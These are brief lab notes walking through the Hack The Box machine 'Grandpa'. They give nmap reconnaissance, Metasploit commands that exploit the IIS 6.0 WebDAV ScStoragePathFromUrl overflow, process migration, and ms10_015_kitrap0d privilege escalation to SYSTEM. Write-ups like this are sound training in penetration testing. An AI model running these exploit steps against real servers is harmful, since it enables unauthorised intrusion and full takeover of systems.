HTB 9. Grandpa

1. `nmap -T4 -A -p- 10.10.10.14` shows 80 open with version `Microsoft IIS httpd 6.0` (dated version) and poentially risky methods (`TRACE` and `PUT)
2. Go to `10.10.10.14` shows "Under Construction" page.
3. Google `Microsoft IIS httpd 6.0 exploit` finds [Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow](https://www.exploit-db.com/exploits/41738) and [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl).
4. `searchsploit ScStoragePathFromUrl` shows python and ruby modules.
5. Metasploit
	```
	use exploit/windows/iis/iis_webdav_scstoragepathfromurl
	set rhost 10.10.10.14
	set lport 5555
	show targets
	run
	```
	Try running again (4 times)
6.	We are not system. `ps` to show processes. Pick a process that has `NT AUTHORITY\NETWORK SERVICE` with `migrate 1788` and success.
7. Priv esc suggester:
	```
	search suggester
	use 0
	options
	set session 1
	run
	```
	Result: 9 options, go down list and try to see what works
8. start with `ms10_015_kitrap0d` and `set lhost tun0`
9. `getuid` is `NT AUTHORITY\SYSTEM`.